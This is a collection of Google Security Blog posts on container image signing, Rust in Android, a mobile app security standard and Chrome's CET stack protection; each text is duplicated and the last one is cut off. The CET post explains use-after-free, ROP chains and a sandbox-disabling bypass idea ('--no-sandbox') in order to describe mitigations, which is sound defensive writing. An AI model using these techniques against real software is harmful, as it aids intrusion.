[
{"website": "Google-Security", "title": "\nMaking the Internet more secure one signed container at a time\n", "author": ["Posted by Priya Wadhwa, Jake Sanders, Google Open Source Security Team"], "link": "https://security.googleblog.com/2021/05/making-internet-more-secure-one-signed.html", "abstract": "                             Posted by Priya Wadhwa, Jake Sanders, Google Open Source Security Team    With over 16 million pulls per month, Google&#8217;s  `distroless` base images  are widely used and depended on by large projects like Kubernetes and Istio. These minimal images don&#8217;t include common tools like shells or package managers, making their attack surface (and download size!) smaller than traditional base images such as `ubuntu` or `alpine`. Even with this additional protection, users could still fall prey to typosquatting attacks, or receive a malicious image if the distroless build process was compromised &#8211; making users vulnerable to accidentally using a malicious image instead of the actual distroless image. This problem isn&#8217;t unique to distroless images &#8211; until now,  there just hasn&#8217;t been an easy way to verify that images are what they claim to be.    Introducing Cosign     Cosign  simplifies signing and verifying container images, aiming to make signatures invisible infrastructure &#8211; basically, it takes over the hard part of signing and verifying software for you.  We developed cosign in collaboration with the  sigstore project , a Linux Foundation project and a non-profit service that seeks to improve the open source software supply chain by easing the adoption of cryptographic software signing, backed by transparency log technologies.  We&#8217;re excited to announce that all of our distroless images are now signed by cosign! This means that all users of distroless can verify that they are indeed using the base image they intended to before kicking off image builds, making distroless images even more trustworthy. In fact, Kubernetes has already begun  performing this check  in their builds.  As we look to the future, Kubernetes SIG Release's vision is to establish a consumable, introspectable, and secure supply chain for the project. By collaborating with the sigstore maintainers (who are fellow Kubernetes contributors) to integrate signing and transparency into our supply chain, we hope to be an exemplar for standards in the cloud native (and wider) tech industry, said Stephen Augustus, co-chair for Kubernetes SIG Release.   How it works     To start signing distroless we integrated cosign into the distroless CI system, which builds and pushes images via Cloud Build. Signing every distroless image was as easy as adding an additional  Cloud Build step  to the Cloud Build job responsible for building and pushing the images. This additional step uses the cosign container image and a key pair stored in  GCP KMS  to sign every distroless image. With this additional signing step, users can now verify that the distroless image they&#8217;re running was built in the correct CI environment.      Right now, cosign can be run as an image or as a CLI tool. It supports:    Hardware and KMS signing  Bring-your-own PKI  Our free OIDC PKI (Fulcio)  Built-in binary transparency and timestamping service (Rekor)   Signing distroless with cosign is just the beginning, and we plan to incorporate other sigstore technologies into distroless to continue to improve it over the next few months. We also can&#8217;t wait to integrate sigstore with other critical projects. Stay tuned here for updates! To get started verifying your own distrolesss images, check out the distroless  README  and to learn more about sigstore, check out  sigstore.dev .                                      Posted by Priya Wadhwa, Jake Sanders, Google Open Source Security TeamWith over 16 million pulls per month, Google’s `distroless` base images are widely used and depended on by large projects like Kubernetes and Istio. These minimal images don’t include common tools like shells or package managers, making their attack surface (and download size!) smaller than traditional base images such as `ubuntu` or `alpine`. Even with this additional protection, users could still fall prey to typosquatting attacks, or receive a malicious image if the distroless build process was compromised – making users vulnerable to accidentally using a malicious image instead of the actual distroless image. This problem isn’t unique to distroless images – until now,  there just hasn’t been an easy way to verify that images are what they claim to be. Introducing Cosign Cosign simplifies signing and verifying container images, aiming to make signatures invisible infrastructure – basically, it takes over the hard part of signing and verifying software for you.We developed cosign in collaboration with the sigstore project, a Linux Foundation project and a non-profit service that seeks to improve the open source software supply chain by easing the adoption of cryptographic software signing, backed by transparency log technologies.We’re excited to announce that all of our distroless images are now signed by cosign! This means that all users of distroless can verify that they are indeed using the base image they intended to before kicking off image builds, making distroless images even more trustworthy. In fact, Kubernetes has already begun performing this check in their builds.As we look to the future, Kubernetes SIG Release's vision is to establish a consumable, introspectable, and secure supply chain for the project. By collaborating with the sigstore maintainers (who are fellow Kubernetes contributors) to integrate signing and transparency into our supply chain, we hope to be an exemplar for standards in the cloud native (and wider) tech industry, said Stephen Augustus, co-chair for Kubernetes SIG Release.How it worksTo start signing distroless we integrated cosign into the distroless CI system, which builds and pushes images via Cloud Build. Signing every distroless image was as easy as adding an additional Cloud Build step to the Cloud Build job responsible for building and pushing the images. This additional step uses the cosign container image and a key pair stored in GCP KMS to sign every distroless image. With this additional signing step, users can now verify that the distroless image they’re running was built in the correct CI environment.Right now, cosign can be run as an image or as a CLI tool. It supports:Hardware and KMS signingBring-your-own PKIOur free OIDC PKI (Fulcio)Built-in binary transparency and timestamping service (Rekor)Signing distroless with cosign is just the beginning, and we plan to incorporate other sigstore technologies into distroless to continue to improve it over the next few months. We also can’t wait to integrate sigstore with other critical projects. Stay tuned here for updates! To get started verifying your own distrolesss images, check out the distroless README and to learn more about sigstore, check out sigstore.dev.      ", "date": "May 6, 2021"},
{"website": "Google-Security", "title": "\n Rust in the Android platform \n", "author": ["Posted by Jeff Vander Stoep and Stephen Hines, Android Team "], "link": "https://security.googleblog.com/2021/04/rust-in-android-platform.html", "abstract": "                             Posted by Jeff Vander Stoep and Stephen Hines, Android Team      Correctness of code in the Android platform is a top priority for the security, stability, and quality of each Android release. Memory safety bugs in C and C++ continue to be the most-difficult-to-address source of incorrectness. We invest a great deal of effort and resources into detecting, fixing, and mitigating this class of bugs, and these efforts are effective in preventing a large number of bugs from making it into Android releases. Yet in spite of these efforts, memory safety bugs continue to be a top contributor of stability issues, and consistently represent ~ 70%  of Android&#8217;s high severity security vulnerabilities.     In addition to  ongoing  and  upcoming  efforts to improve detection of memory bugs, we are ramping up efforts to prevent them in the first place. Memory-safe languages are the most cost-effective means for preventing memory bugs. In addition to memory-safe languages like Kotlin and Java, we&#8217;re excited to announce that the Android Open Source Project (AOSP) now supports the Rust programming language for developing the OS itself.    Systems programming    Managed languages like Java and Kotlin are the best option for Android app development. These languages are designed for ease of use, portability, and safety. The  Android Runtime (ART)  manages memory on behalf of the developer. The Android OS uses Java extensively, effectively protecting large portions of the Android platform from memory bugs. Unfortunately, for the lower layers of the OS, Java and Kotlin are not an option.            Lower levels of the OS require systems programming languages like C, C++, and Rust. These languages are designed with control and predictability as goals. They provide access to low level system resources and hardware. They are light on resources and have more predictable performance characteristics.  For C and C++, the developer is responsible for managing memory lifetime. Unfortunately,  it's easy to make mistakes  when doing this, especially in complex and multithreaded codebases.      Rust provides memory safety guarantees by using a combination of compile-time checks to enforce object lifetime/ownership and runtime checks to ensure that memory accesses are valid. This safety is achieved while providing equivalent performance to C and C++.    The limits of sandboxing    C and C++ languages don&#8217;t provide these same safety guarantees and require robust isolation. All Android processes are sandboxed and we follow the  Rule of 2  to decide if functionality necessitates additional isolation and deprivileging. The Rule of 2 is simple: given three options, developers may only select two of the following three options.           For Android, this means that if code is written in C/C++ and parses untrustworthy input, it should be contained within a tightly constrained and unprivileged sandbox. While  adherence to the Rule of 2  has been effective in reducing the severity and reachability of security vulnerabilities, it does come with limitations. Sandboxing is expensive: the new processes it requires  consume additional overhead and introduce latency  due to IPC and additional memory usage. Sandboxing doesn&#8217;t eliminate vulnerabilities from the code and its efficacy is reduced by  high bug density , allowing attackers to chain multiple vulnerabilities together.     Memory-safe languages like Rust help us overcome these limitations in two ways:       Lowers the density of bugs within our code, which increases the effectiveness of our current sandboxing.   Reduces our sandboxing needs, allowing introduction of new features that are both safer and lighter on resources.      But what about all that existing C++?      Of course, introducing a new programming language does nothing to address bugs in our existing C/C++ code. Even if we redirected the efforts of every software engineer on the Android team, rewriting tens of millions of lines of code is simply not feasible.            The above analysis of the age of memory safety bugs in Android (measured from when they were first introduced) demonstrates why our memory-safe language efforts are best focused on new development and not on rewriting mature C/C++ code. Most of our memory bugs occur in new or recently modified code, with about 50% being less than a year old.      The comparative rarity of older memory bugs may come as a surprise to some, but we&#8217;ve found that old code is not where we most urgently need improvement. Software bugs are found and fixed over time, so we would expect the number of bugs in code that is being maintained but not actively developed to go down over time. Just as reducing the number and density of bugs improves the effectiveness of sandboxing, it also improves the effectiveness of bug detection.    Limitations of detection      Bug detection via robust testing,  sanitization , and  fuzzing  is crucial for improving the quality and correctness of all software, including software written in Rust. A key limitation for the most effective memory safety detection techniques is that the erroneous state must actually be triggered in instrumented code in order to be detected. Even in code bases with excellent test/fuzz coverage, this results in a lot of bugs going undetected.     Another limitation is that  bug detection is scaling faster than bug fixing . In some projects,  bugs that are being detected are not always getting fixed . Bug fixing is a long and costly process.                Each of these steps is costly, and missing any one of them can result in the bug going unpatched for some or all users. For complex C/C++ code bases, often there are only a handful of people capable of developing and reviewing the fix, and even with a high amount of effort spent on fixing bugs,  sometimes the fixes are incorrect .     Bug detection is most effective when bugs are relatively rare and dangerous bugs can be given the urgency and priority that they merit. Our ability to reap the benefits of improvements in bug detection require that we prioritize preventing the introduction of new bugs.     Prioritizing prevention      Rust modernizes a range of other language aspects, which results in improved correctness of code:        Memory safety -  enforces memory safety through a combination of compiler and run-time checks.    Data concurrency -  prevents data races. The ease with which this allows users to write efficient, thread-safe code has given rise to Rust&#8217;s  Fearless Concurrency  slogan.    More expressive type system -  helps prevent logical programming bugs (e.g. newtype wrappers, enum variants with contents).    References and variables are immutable by default -  assist the developer in following the security principle of least privilege, marking a reference or variable mutable only when they actually intend it to be so. While C++ has const, it tends to be used infrequently and inconsistently. In comparison, the Rust compiler assists in avoiding stray mutability annotations by offering warnings for mutable values which are never mutated.     Better error handling in standard libraries -  wrap potentially failing calls in Result, which causes the compiler to require that users check for failures even for functions which do not return a needed value. This protects against bugs like the  Rage Against the Cage  vulnerability which resulted from an unhandled error. By making it easy to propagate errors via the ? operator and optimizing Result for low overhead, Rust encourages users to write their fallible functions in the same style and receive the same protection.    Initialization -  requires that all variables be initialized before use. Uninitialized memory vulnerabilities have historically been the root cause of 3-5% of security vulnerabilities on Android. In Android 11, we started  auto initializing memory in C/C++  to reduce this problem. However, initializing to zero is not always safe, particularly for things like return values, where this could become a new source of faulty error handling. Rust requires every variable be initialized to a legal member of its type before use, avoiding the issue of unintentionally initializing to an unsafe value. Similar to Clang for C/C++, the Rust compiler is aware of the initialization requirement, and avoids any potential performance overhead of double initialization.    Safer integer handling -  Overflow sanitization is on for Rust debug builds by default, encouraging programmers to specify a wrapping_add if they truly intend a calculation to overflow or saturating_add if they don&#8217;t. We intend to enable overflow sanitization for all builds in Android. Further, all integer type conversions are explicit casts: developers can not accidentally cast during a function call when assigning to a variable or when attempting to do arithmetic with other types.      Where we go from here      Adding a new language to the Android platform is a large undertaking. There are toolchains and dependencies that need to be maintained, test infrastructure and tooling that must be updated, and developers that need to be trained. For the past 18 months we have been adding Rust support to the Android Open Source Project, and we have a few early adopter projects that we will be sharing in the coming months. Scaling this to more of the OS is a multi-year project. Stay tuned, we will be posting more updates on this blog.      Java is a registered trademark of Oracle and/or its affiliates.     Thanks Matthew Maurer, Bram Bonne, and Lars Bergstrom for contributions to this post. Special thanks to our colleagues, Adrian Taylor for his insight into the age of memory vulnerabilities, and to Chris Palmer for his work on &#8220;The Rule of 2&#8221; and &#8220;The limits of Sandboxing&#8221;.                                      Posted by Jeff Vander Stoep and Stephen Hines, Android Team    Correctness of code in the Android platform is a top priority for the security, stability, and quality of each Android release. Memory safety bugs in C and C++ continue to be the most-difficult-to-address source of incorrectness. We invest a great deal of effort and resources into detecting, fixing, and mitigating this class of bugs, and these efforts are effective in preventing a large number of bugs from making it into Android releases. Yet in spite of these efforts, memory safety bugs continue to be a top contributor of stability issues, and consistently represent ~70% of Android’s high severity security vulnerabilities.   In addition to ongoing and upcoming efforts to improve detection of memory bugs, we are ramping up efforts to prevent them in the first place. Memory-safe languages are the most cost-effective means for preventing memory bugs. In addition to memory-safe languages like Kotlin and Java, we’re excited to announce that the Android Open Source Project (AOSP) now supports the Rust programming language for developing the OS itself.  Systems programming  Managed languages like Java and Kotlin are the best option for Android app development. These languages are designed for ease of use, portability, and safety. The Android Runtime (ART) manages memory on behalf of the developer. The Android OS uses Java extensively, effectively protecting large portions of the Android platform from memory bugs. Unfortunately, for the lower layers of the OS, Java and Kotlin are not an option.    Lower levels of the OS require systems programming languages like C, C++, and Rust. These languages are designed with control and predictability as goals. They provide access to low level system resources and hardware. They are light on resources and have more predictable performance characteristics.For C and C++, the developer is responsible for managing memory lifetime. Unfortunately, it's easy to make mistakes when doing this, especially in complex and multithreaded codebases.   Rust provides memory safety guarantees by using a combination of compile-time checks to enforce object lifetime/ownership and runtime checks to ensure that memory accesses are valid. This safety is achieved while providing equivalent performance to C and C++.  The limits of sandboxing  C and C++ languages don’t provide these same safety guarantees and require robust isolation. All Android processes are sandboxed and we follow the Rule of 2 to decide if functionality necessitates additional isolation and deprivileging. The Rule of 2 is simple: given three options, developers may only select two of the following three options.    For Android, this means that if code is written in C/C++ and parses untrustworthy input, it should be contained within a tightly constrained and unprivileged sandbox. While adherence to the Rule of 2 has been effective in reducing the severity and reachability of security vulnerabilities, it does come with limitations. Sandboxing is expensive: the new processes it requires consume additional overhead and introduce latency due to IPC and additional memory usage. Sandboxing doesn’t eliminate vulnerabilities from the code and its efficacy is reduced by high bug density, allowing attackers to chain multiple vulnerabilities together.   Memory-safe languages like Rust help us overcome these limitations in two ways:    Lowers the density of bugs within our code, which increases the effectiveness of our current sandboxing.  Reduces our sandboxing needs, allowing introduction of new features that are both safer and lighter on resources.   But what about all that existing C++?    Of course, introducing a new programming language does nothing to address bugs in our existing C/C++ code. Even if we redirected the efforts of every software engineer on the Android team, rewriting tens of millions of lines of code is simply not feasible.     The above analysis of the age of memory safety bugs in Android (measured from when they were first introduced) demonstrates why our memory-safe language efforts are best focused on new development and not on rewriting mature C/C++ code. Most of our memory bugs occur in new or recently modified code, with about 50% being less than a year old.    The comparative rarity of older memory bugs may come as a surprise to some, but we’ve found that old code is not where we most urgently need improvement. Software bugs are found and fixed over time, so we would expect the number of bugs in code that is being maintained but not actively developed to go down over time. Just as reducing the number and density of bugs improves the effectiveness of sandboxing, it also improves the effectiveness of bug detection.  Limitations of detection    Bug detection via robust testing, sanitization, and fuzzing is crucial for improving the quality and correctness of all software, including software written in Rust. A key limitation for the most effective memory safety detection techniques is that the erroneous state must actually be triggered in instrumented code in order to be detected. Even in code bases with excellent test/fuzz coverage, this results in a lot of bugs going undetected.   Another limitation is that bug detection is scaling faster than bug fixing. In some projects, bugs that are being detected are not always getting fixed. Bug fixing is a long and costly process.       Each of these steps is costly, and missing any one of them can result in the bug going unpatched for some or all users. For complex C/C++ code bases, often there are only a handful of people capable of developing and reviewing the fix, and even with a high amount of effort spent on fixing bugs, sometimes the fixes are incorrect.   Bug detection is most effective when bugs are relatively rare and dangerous bugs can be given the urgency and priority that they merit. Our ability to reap the benefits of improvements in bug detection require that we prioritize preventing the introduction of new bugs.   Prioritizing prevention    Rust modernizes a range of other language aspects, which results in improved correctness of code:    Memory safety - enforces memory safety through a combination of compiler and run-time checks.  Data concurrency - prevents data races. The ease with which this allows users to write efficient, thread-safe code has given rise to Rust’s Fearless Concurrency slogan.  More expressive type system - helps prevent logical programming bugs (e.g. newtype wrappers, enum variants with contents).  References and variables are immutable by default - assist the developer in following the security principle of least privilege, marking a reference or variable mutable only when they actually intend it to be so. While C++ has const, it tends to be used infrequently and inconsistently. In comparison, the Rust compiler assists in avoiding stray mutability annotations by offering warnings for mutable values which are never mutated.   Better error handling in standard libraries - wrap potentially failing calls in Result, which causes the compiler to require that users check for failures even for functions which do not return a needed value. This protects against bugs like the Rage Against the Cage vulnerability which resulted from an unhandled error. By making it easy to propagate errors via the ? operator and optimizing Result for low overhead, Rust encourages users to write their fallible functions in the same style and receive the same protection.  Initialization - requires that all variables be initialized before use. Uninitialized memory vulnerabilities have historically been the root cause of 3-5% of security vulnerabilities on Android. In Android 11, we started auto initializing memory in C/C++ to reduce this problem. However, initializing to zero is not always safe, particularly for things like return values, where this could become a new source of faulty error handling. Rust requires every variable be initialized to a legal member of its type before use, avoiding the issue of unintentionally initializing to an unsafe value. Similar to Clang for C/C++, the Rust compiler is aware of the initialization requirement, and avoids any potential performance overhead of double initialization.  Safer integer handling - Overflow sanitization is on for Rust debug builds by default, encouraging programmers to specify a wrapping_add if they truly intend a calculation to overflow or saturating_add if they don’t. We intend to enable overflow sanitization for all builds in Android. Further, all integer type conversions are explicit casts: developers can not accidentally cast during a function call when assigning to a variable or when attempting to do arithmetic with other types.   Where we go from here    Adding a new language to the Android platform is a large undertaking. There are toolchains and dependencies that need to be maintained, test infrastructure and tooling that must be updated, and developers that need to be trained. For the past 18 months we have been adding Rust support to the Android Open Source Project, and we have a few early adopter projects that we will be sharing in the coming months. Scaling this to more of the OS is a multi-year project. Stay tuned, we will be posting more updates on this blog.   Java is a registered trademark of Oracle and/or its affiliates.  Thanks Matthew Maurer, Bram Bonne, and Lars Bergstrom for contributions to this post. Special thanks to our colleagues, Adrian Taylor for his insight into the age of memory vulnerabilities, and to Chris Palmer for his work on “The Rule of 2” and “The limits of Sandboxing”.      ", "date": "April 6, 2021"},
{"website": "Google-Security", "title": "\n A New Standard for Mobile App Security \n", "author": ["Posted by Brooke Davis and Eugene Liderman, Android Security and Privacy Team"], "link": "https://security.googleblog.com/2021/04/a-new-standard-for-mobile-app-security.html", "abstract": "                             Posted by Brooke Davis and Eugene Liderman, Android Security and Privacy Team          With all of the challenges from this past year, users have become increasingly dependent on their mobile devices to create fitness routines, stay connected with loved ones, work remotely, and order things like groceries with ease. According to  eMarketer , in 2020 users spent over three and a half hours per day using mobile apps. With so much time spent on mobile devices, ensuring the safety of mobile apps is more important than ever. Despite the importance of digital security, there isn&#8217;t a consistent industry standard for assessing mobile apps. Existing guidelines tend to be either too lightweight or too onerous for the average developer, and lack a compliance arm. That&#8217;s why we're excited to share  ioXt&#8217;s announcement  of a new  Mobile Application Profile  which provides a set of security and privacy requirements with defined acceptance criteria which developers can certify their apps against.      Over 20 industry stakeholders, including  Google ,  Amazon , and a number of certified labs such as  NCC Group  and  Dekra , as well as automated mobile app security testing vendors like  NowSecure  collaborated to develop this new security standard for mobile apps. We&#8217;ve seen early interest from Internet of Things (IoT) and virtual private network (VPN) developers, however the standard is appropriate for any cloud connected service such as social, messaging, fitness, or productivity apps.     The  Internet of Secure Things Alliance (ioXt)  manages a security compliance assessment program for connected devices. ioXt has over 300 members across various industries, including Google, Amazon, Facebook, T-Mobile, Comcast, Zigbee Alliance, Z-Wave Alliance, Legrand, Resideo, Schneider Electric, and many others. With so many companies involved, ioXt covers a wide range of device types, including smart lighting, smart speakers, and webcams, and since most smart devices are managed through apps, they have expanded coverage to include mobile apps with the launch of this profile.     The ioXt  Mobile Application Profile  provides a minimum set of commercial best practices for all cloud connected apps running on mobile devices.  This security baseline helps mitigate against common threats and reduces the probability of significant vulnerabilities.  The profile leverages existing standards and principles set forth by  OWASP MASVS  and the   VPN Trust Initiative  , and allows developers to differentiate security capabilities around cryptography, authentication, network security, and vulnerability disclosure program quality. The profile also provides a framework to evaluate app category specific requirements which may be applied based on the features contained in the app. For example, an IoT app only needs to certify under the Mobile Application profile, whereas a VPN app must comply with the Mobile Application profile, plus the VPN extension.     Certification allows developers to demonstrate product safety and we&#8217;re excited about the opportunity for this standard to push the industry forward. We observed that app developers were very quick to resolve any issues that were identified during their blackbox evaluations against this new standard, oftentimes with turnarounds in a matter of days. At launch, the following apps have been certified:  Comcast ,  ExpressVPN ,  GreenMAX ,  Hubspace ,  McAfee Innovations ,  NordVPN ,  OpenVPN for Android ,  Private Internet Access ,  VPN Private , as well as the  Google One  app, including  VPN by Google One .     We look forward to seeing adoption of the standard grow over time and for those app developers that are already investing in security best practices to be able to highlight their efforts. The standard also serves as a guiding light to inspire more developers to invest in mobile app security. If you are interested in learning more about the ioXt Alliance and how to get your app certified, visit  https://compliance.ioxtalliance.org/sign-up  and check out Android&#8217;s guidelines for building secure apps  here .                                     Posted by Brooke Davis and Eugene Liderman, Android Security and Privacy Team   With all of the challenges from this past year, users have become increasingly dependent on their mobile devices to create fitness routines, stay connected with loved ones, work remotely, and order things like groceries with ease. According to eMarketer, in 2020 users spent over three and a half hours per day using mobile apps. With so much time spent on mobile devices, ensuring the safety of mobile apps is more important than ever. Despite the importance of digital security, there isn’t a consistent industry standard for assessing mobile apps. Existing guidelines tend to be either too lightweight or too onerous for the average developer, and lack a compliance arm. That’s why we're excited to share ioXt’s announcement of a new Mobile Application Profile which provides a set of security and privacy requirements with defined acceptance criteria which developers can certify their apps against.    Over 20 industry stakeholders, including Google, Amazon, and a number of certified labs such as NCC Group and Dekra, as well as automated mobile app security testing vendors like NowSecure collaborated to develop this new security standard for mobile apps. We’ve seen early interest from Internet of Things (IoT) and virtual private network (VPN) developers, however the standard is appropriate for any cloud connected service such as social, messaging, fitness, or productivity apps.   The Internet of Secure Things Alliance (ioXt) manages a security compliance assessment program for connected devices. ioXt has over 300 members across various industries, including Google, Amazon, Facebook, T-Mobile, Comcast, Zigbee Alliance, Z-Wave Alliance, Legrand, Resideo, Schneider Electric, and many others. With so many companies involved, ioXt covers a wide range of device types, including smart lighting, smart speakers, and webcams, and since most smart devices are managed through apps, they have expanded coverage to include mobile apps with the launch of this profile.   The ioXt Mobile Application Profile provides a minimum set of commercial best practices for all cloud connected apps running on mobile devices.  This security baseline helps mitigate against common threats and reduces the probability of significant vulnerabilities.  The profile leverages existing standards and principles set forth by OWASP MASVS and the VPN Trust Initiative, and allows developers to differentiate security capabilities around cryptography, authentication, network security, and vulnerability disclosure program quality. The profile also provides a framework to evaluate app category specific requirements which may be applied based on the features contained in the app. For example, an IoT app only needs to certify under the Mobile Application profile, whereas a VPN app must comply with the Mobile Application profile, plus the VPN extension.   Certification allows developers to demonstrate product safety and we’re excited about the opportunity for this standard to push the industry forward. We observed that app developers were very quick to resolve any issues that were identified during their blackbox evaluations against this new standard, oftentimes with turnarounds in a matter of days. At launch, the following apps have been certified: Comcast, ExpressVPN, GreenMAX, Hubspace, McAfee Innovations, NordVPN, OpenVPN for Android, Private Internet Access, VPN Private, as well as the Google One app, including VPN by Google One.   We look forward to seeing adoption of the standard grow over time and for those app developers that are already investing in security best practices to be able to highlight their efforts. The standard also serves as a guiding light to inspire more developers to invest in mobile app security. If you are interested in learning more about the ioXt Alliance and how to get your app certified, visit https://compliance.ioxtalliance.org/sign-up and check out Android’s guidelines for building secure apps here.      ", "date": "April 15, 2021"},
{"website": "Google-Security", "title": "\nEnabling Hardware-enforced Stack Protection (cetcompat) in Chrome\n", "author": ["Alex Gough, Engineer, Chrome Platform Security Team"], "link": "https://security.googleblog.com/2021/05/enabling-hardware-enforced-stack.html", "abstract": "                             Alex Gough, Engineer, Chrome Platform Security Team    Chrome 90 for Windows adopts Hardware-enforced Stack Protection, a mitigation technology to make the exploitation of security bugs more difficult for attackers. This is supported by Windows 20H1 (December Update) or later, running on processors with Control-flow Enforcement Technology (CET) such as Intel 11th Gen or AMD Zen 3 CPUs. With this mitigation the processor maintains a new, protected, stack of valid return addresses (a shadow stack). This improves security by making exploits more difficult to write. However, it may affect stability if software that loads itself into Chrome is not compatible with the mitigation. Below we describe some exploitation techniques that are mitigated by stack protection, discuss its limitations and what we will do next to approach them. Finally, we provide some quick tips for other software authors as they enable /cetcompat for their Windows applications.     Stack Protection       Imagine a simple use-after-free (UAF) bug where an attacker can induce a program to call a pointer of their choosing. Here the attacker controls an object which occupies space formerly used by another object, which the program erroneously continues to use. The attacker sets a field in this region that is used as a function call to the address of code the attacker would like to execute. Years ago an attacker could simply write their shellcode to a known location, then, in their overwrite, set the instruction pointer to this shellcode. In time, Data Execution Prevention was added to prevent stacks or heaps from being executable.     In response, attackers invented Return Oriented Programming (ROP). Here, attackers take advantage of the process&#8217;s own code, as that must be executable. With control of the stack (either to write values there, or by changing the stack pointer) and control of the instruction pointer, an attacker can use the `ret` instruction to jump to a different, useful, piece of code.                During an exploit attempt, the instruction pointer is changed so that instead of its normal destination, a small fragment of code, called an ROP gadget, is invoked instead. These gadgets are selected so that they do something useful (such as prepare a register for a function call) then call return.     These tiny fragments need not be a complete function in the normal program, and could even be found part-way through a legitimate instruction. By lining up the right set of &#8220;return&#8221; addresses, a chain of these gadgets can be called, with each gadget&#8217;s `ret` switching to the next gadget. With some patience, or the right tooling, an attacker can piece together the arguments to a function call, then really call the function.     Chrome has a  multi-process architecture  -- a main browser process acts as the logged-in user, and spawns restricted renderer and utility processes to host website code. This isolation reduces the severity of a bug in a renderer as its process cannot do much by itself. Attackers will then attempt to use another sandbox escape bug to run code in the browser, which lets them act as the logged-in user. As libraries are mapped at the same address in different processes by Windows, any bug that allows an attacker to read memory is enough for them to examine Chrome&#8217;s binary and any loaded libraries for ROP gadgets. This makes preventing ROP chains in the browser process especially useful as a mitigation.     Enter stack-protection. Along with the existing stack, the cpu maintains a shadow stack. This stack cannot be directly manipulated by normal program code and only stores return addresses. The CALL instruction is modified to push a return address (the instruction after the CALL) to both the normal stack, and the shadow stack. The RET (return) instruction still takes its return address from the normal stack, but now verifies that it is the same as the one stored in the shadow stack region. If it is, then the program is left alone and it continues to work as it always did. If the addresses do not match then an exception is raised which is intercepted by the operating system (not by Chrome). The operating system has an opportunity to modify  the shadow region and allow the program to continue, but in most cases an address mismatch is the result of a program error so the program is immediately terminated.                 In our example above, the attacker will be able to make their initial jump into a ROP gadget, but on trying to return to their next gadget they will be stopped.     Some software may be incompatible with this mechanism, especially some older security software that injects into a process and hooks operating system functions by overwriting the prelude with `rax = &amp;hook; push rax; ret`.     Limitations       Chrome does not yet support every direction of control flow enforcement. Stack protection enforces the reverse-edge of the call graph but does not constrain the forward-edge. It will still be possible to make indirect jumps around existing code as stack protection is only validated when a return instruction is encountered, and call targets are not validated. On Windows a technology called Control Flow Guard (CFG) can be used to verify the target of an indirect function call before it is attempted. This prevents calling into the middle of a function, significantly reducing the scope of useful instructions for attackers to use. Another approach is provided by Intel&#8217;s CET which includes an ENDBRANCH instruction to prevent jumps into arbitrary code locations. Memory tagging tools such as MTE can be used to make it more difficult to modify pointers to valid code sequences (and makes UAFs more difficult in general). We are  working to introduce CFG  to Chrome for Windows, and will add other techniques over time.     By itself, stack protection can be bypassed in some contexts. For instance, stack protection does not prevent an attacker tricking a program into calling an existing function by entirely replacing an object containing a function pointer. This approach does not involve ROP as the function call happens instead of the expected call, and returns to the address it was originally called from, so must be allowed. However, the called function must be useful to an attacker, and most functions will not be. An example of an attack using this method is to craft a call to add the `--no-sandbox` argument to Chrome&#8217;s command line. This results in future renderers being launched without normal protections. Over time we will identify and  remove  such useful tools.     In the renderer, for performance reasons, our javascript and wasm engines may use memory that is both writable and executable at the same time. This allows an attacker to modify code that v8 is already going to execute, saving them the trouble of constructing a ROP chain. This explains why it was not our first priority to make v8 CET compatible, and why stack-protection is not yet enabled in the renderer.     Finally, stack protection doesn&#8217;t stop the bugs in the first place. Everything we have discussed above is a mitigation that makes it more difficult to execute arbitrary code. If a programming error allows arbitrary writes then it is very unlikely that we can prevent this being used to run arbitrary code. Attackers will adapt and find new ways to turn memory safety errors into code execution.     Debugging Tips       You can see if Hardware-enforced Stack Protection is enabled for a process using the Windows Task Manager. Open task manager, open the Details Tab, Right Click on a heading, Select Columns &amp; Check the Hardware-enforced Stack Protection box. The process display will then indicate if a process is opted-in to this mitigation. &#8216;Compatible Modules Only&#8217; indicates that any dll marked as /cetcompat at build time will raise an exception if a return address is invalid.           You can see which Chrome processes are opted-out of CET by consulting the Mitigations field of chrome://sandbox and clicking &#8216;+&#8217;. All processes are included unless the mitigation CET_USER_SHADOW_STACKS_ALWAYS_OFF is present in the expanded details view.     If you are developing software, or debugging a problem in Chrome the shadow stack can be helpful as it includes only return addresses, and these cannot be corrupted by rogue writes elsewhere in the process. To see these registers use the `r` command in windbg with the mask option:     0:159> rM 8002     rax=00000000c000060a rbx=000000fa5bbfeff0 rcx=0000000000000030     rdx=0000000000000000 rsi=00007ffba4118924 rdi=000000fa5bbff1a0     rip=00007ffc1847b4a1 rsp=000000fa5bbfc0a0 rbp=000000fa5bbfc0a0      r8=000000fa5bbfc098  r9=0000000000000000 r10=0000000000000000     r11=0000000000000246 r12=000000fa5bbfe230 r13=000002c3450b5830     r14=000002c3450b7850 r15=000000fa5bbfc260     iopl=0         nv up ei pl zr na po nc     ssp=000000fa5c3fef10 cetumsr=0000000000000001     `ssp` points to the shadow stack region, `cetumsr` indicates if cet is enabled for the process.     You can then see the call stack within the shadow region using `dps @ssp`. Values are not overwritten so you can also see where you came from by looking a bit deeper: `dps @ssp-20`.     If a process is not compatible with Hardware-enforced Stack Protection, the system event log (Application Log) will include brief error reports (Id:1001). You can filter those related to cetcompat using the following powershell snippet:-     Get-WinEvent -MaxEvents 128 -FilterHashtable @{ LogName='Application'; Id='1001' } `       | Where-Object {$_.Message -match 'chrome.exe'} `       | Select-Object -First 8 `       | fl     These will include the following parameters:-     P1: application.exe     P2: application version     P3: application build ts     P4: faulting module .dll     P5: faulting module version     P6: faulting module build ts     P7: faulting offset in P4 from base_address     P8: exception code (c0000409)     P9: subcode (00...000030)     If Chrome is misbehaving and you think it might be because of cetcompat, it is possible to disable it using Image File Execution Options - we do not recommend this except for a limited period of testing. If you find you have to do this, please raise an issue on https://crbug.com so that we can investigate the failure.    Further Reading        Intel  ISA  (Chapter 18)    Microsoft&#8217;s Developer Guidance    Excellent posts by Shamir & Ionescu:  RIP ROP ,  CET On Xanax , &  Dynamic CET       Summary      /cetcompat is enabled for most processes for Chrome M90 on Windows. Enabling Hardware-enforced Stack Protection will layer with existing and future measures to make exploitation more difficult and so more expensive for an attacker, ultimately protecting the people who use Chrome every day.                                     Alex Gough, Engineer, Chrome Platform Security Team  Chrome 90 for Windows adopts Hardware-enforced Stack Protection, a mitigation technology to make the exploitation of security bugs more difficult for attackers. This is supported by Windows 20H1 (December Update) or later, running on processors with Control-flow Enforcement Technology (CET) such as Intel 11th Gen or AMD Zen 3 CPUs. With this mitigation the processor maintains a new, protected, stack of valid return addresses (a shadow stack). This improves security by making exploits more difficult to write. However, it may affect stability if software that loads itself into Chrome is not compatible with the mitigation. Below we describe some exploitation techniques that are mitigated by stack protection, discuss its limitations and what we will do next to approach them. Finally, we provide some quick tips for other software authors as they enable 